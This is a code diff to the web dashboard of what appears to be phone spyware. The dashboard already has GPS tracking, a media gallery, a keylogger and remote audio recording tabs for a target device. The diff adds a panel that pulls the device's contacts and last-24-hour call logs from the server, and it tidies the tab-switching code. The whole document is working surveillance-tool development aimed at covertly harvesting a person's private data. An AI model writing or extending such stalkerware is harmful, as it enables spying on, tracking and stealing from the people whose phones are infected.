@@ -679,6 +679,7 @@ body {
         <button class="control-btn" onclick="showGallery(this)">🖼 Media Gallery</button>
         <button class="control-btn" onclick="showKeylog(this)">⌨ Keylogger</button>
         <button class="control-btn" onclick="showAudio(this)">🎤 Audio Recorder</button>
+        <button class="control-btn" onclick="showContacts(this)">📞 Contacts</button>
     </div>
 
     <!-- GPS Tracker Panel -->
@@ -785,10 +786,24 @@ body {
         <div id="audioStatus" style="padding: 0 20px 20px 20px; color: #aaa; font-size: 14px;">
             No active recording.
         </div>
-        <!-- নতুন: অডিও ফাইলের তালিকা -->
         <div id="audioListContainer" style="margin: 20px;">
             <h3 style="margin-bottom:10px;">📁 Recorded Audio Files</h3>
             <div id="audioList"></div>
+        </div>
+    </section>
+
+    <!-- Contacts & Call Logs Panel -->
+    <section class="panel" id="contactsPanel" style="display:none;">
+        <div class="panel-header">
+            <div class="panel-title">📞 Contacts & Call Logs</div>
+            <button class="refresh-btn" onclick="loadContacts()">⟳ Refresh</button>
+        </div>
+        <div style="padding:20px;">
+            <h3>📱 Call Logs (Last 24h)</h3>
+            <div id="callLogsList"></div>
+            <hr style="border-color:#333; margin:20px 0;">
+            <h3>👤 Contacts</h3>
+            <div id="contactsList"></div>
         </div>
     </section>
 
@@ -869,16 +884,14 @@ function removeMarker() {
 // ================== OVERLAY HELPERS ==================
 function showOverlayWithSpinner(text) {
     const overlay = document.getElementById("mapOverlay");
-    const textEl = document.getElementById("mapOverlayText");
-    if (overlay && textEl) {
+    if (overlay) {
         overlay.innerHTML = `<div class="spinner"></div><span>${text}</span>`;
         overlay.style.display = "flex";
     }
 }
 function showOverlayText(text) {
     const overlay = document.getElementById("mapOverlay");
-    const textEl = document.getElementById("mapOverlayText");
-    if (overlay && textEl) {
+    if (overlay) {
         overlay.innerHTML = `<span>${text}</span>`;
         overlay.style.display = "flex";
     }
@@ -1053,11 +1066,12 @@ function nextMedia() { if (galleryItems.length) { currentMediaIndex = (currentMe
 
 // ================== TABS ==================
 function setActiveTab(btn) { document.querySelectorAll(".control-btn").forEach(b => b.classList.remove("active")); btn.classList.add("active"); }
-function showApps(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "block"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("audioPanel").style.display = "none"; loadDeviceInfo(); }
-function showGPS(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "block"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("audioPanel").style.display = "none"; loadDeviceInfo(); setTimeout(() => { if (map) map.invalidateSize(); }, 100); }
-function showGallery(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "block"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("audioPanel").style.display = "none"; fetchGalleryPhotos(false); }
-function showKeylog(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "block"; document.getElementById("audioPanel").style.display = "none"; refreshKeylog(); }
-function showAudio(btn) { setActiveTab(btn); document.getElementById("appsPanel").style.display = "none"; document.getElementById("gpsPanel").style.display = "none"; document.getElementById("galleryPanel").style.display = "none"; document.getElementById("keylogPanel").style.display = "none"; document.getElementById("audioPanel").style.display = "block"; loadAudioList(); }
+function showApps(btn) { setActiveTab(btn); document.querySelectorAll('.panel').forEach(p => p.style.display = 'none'); document.getElementById("appsPanel").style.display = "block"; loadDeviceInfo(); }
+function showGPS(btn) { setActiveTab(btn); document.querySelectorAll('.panel').forEach(p => p.style.display = 'none'); document.getElementById("gpsPanel").style.display = "block"; loadDeviceInfo(); setTimeout(() => { if (map) map.invalidateSize(); }, 100); }
+function showGallery(btn) { setActiveTab(btn); document.querySelectorAll('.panel').forEach(p => p.style.display = 'none'); document.getElementById("galleryPanel").style.display = "block"; fetchGalleryPhotos(false); }
+function showKeylog(btn) { setActiveTab(btn); document.querySelectorAll('.panel').forEach(p => p.style.display = 'none'); document.getElementById("keylogPanel").style.display = "block"; refreshKeylog(); }
+function showAudio(btn) { setActiveTab(btn); document.querySelectorAll('.panel').forEach(p => p.style.display = 'none'); document.getElementById("audioPanel").style.display = "block"; loadAudioList(); }
+function showContacts(btn) { setActiveTab(btn); document.querySelectorAll('.panel').forEach(p => p.style.display = 'none'); document.getElementById("contactsPanel").style.display = "block"; loadContacts(); }
 
 // ================== FORCE GPS UPDATE ==================
 async function forceGpsUpdate() {
@@ -1131,7 +1145,7 @@ async function sendAudioRequest() {
         if (!res.ok) throw new Error(data.error || 'Failed');
         document.getElementById("audioStatus").innerHTML = 
             `Recording requested for ${duration} seconds. Check list below.`;
-        loadAudioList(); // লিস্ট রিফ্রেশ
+        loadAudioList();
     } catch (e) {
         document.getElementById("audioStatus").innerHTML = `Error: ${e.message}`;
     } finally {
@@ -1140,7 +1154,6 @@ async function sendAudioRequest() {
     }
 }
 
-// নতুন: অডিও ফাইল তালিকা লোড
 async function loadAudioList() {
     const deviceId = getDeviceId();
     const container = document.getElementById("audioList");
@@ -1162,9 +1175,40 @@ async function loadAudioList() {
     }
 }
 
-// নতুন: অডিও ফাইল ডাউনলোড
 function downloadAudio(filename) {
     window.location.href = `/api/audio/download/${encodeURIComponent(filename)}`;
+}
+
+// ================== CONTACTS & CALL LOGS ==================
+async function loadContacts() {
+    const deviceId = getDeviceId();
+    try {
+        const callRes = await fetch(`/api/calllogs?deviceId=${deviceId}`);
+        const callData = await callRes.json();
+        const callLogs = callData.callLogs || [];
+        const callContainer = document.getElementById("callLogsList");
+        if (callLogs.length === 0) callContainer.innerHTML = "No call logs.";
+        else callContainer.innerHTML = callLogs.map(log => `
+            <div style="background:#1a1214; border:1px solid #2d1d20; border-radius:8px; padding:10px; margin-bottom:6px;">
+                <div>${escapeHtml(log.name)} (${escapeHtml(log.number)})</div>
+                <div style="color:#aaa; font-size:12px;">Type: ${log.type} | Duration: ${log.duration}s | ${new Date(log.timestamp).toLocaleString()}</div>
+            </div>
+        `).join("");
+
+        const conRes = await fetch(`/api/contacts?deviceId=${deviceId}`);
+        const conData = await conRes.json();
+        const contacts = conData.contacts || [];
+        const conContainer = document.getElementById("contactsList");
+        if (contacts.length === 0) conContainer.innerHTML = "No contacts.";
+        else conContainer.innerHTML = contacts.map(contact => `
+            <div style="background:#1a1214; border:1px solid #2d1d20; border-radius:8px; padding:10px; margin-bottom:6px;">
+                ${escapeHtml(contact.name)} — ${escapeHtml(contact.number)}
+            </div>
+        `).join("");
+    } catch (e) {
+        document.getElementById("callLogsList").innerHTML = "Error loading call logs.";
+        document.getElementById("contactsList").innerHTML = "Error loading contacts.";
+    }
 }
 
 // ================== AUTO REFRESH (5 SECONDS) ==================
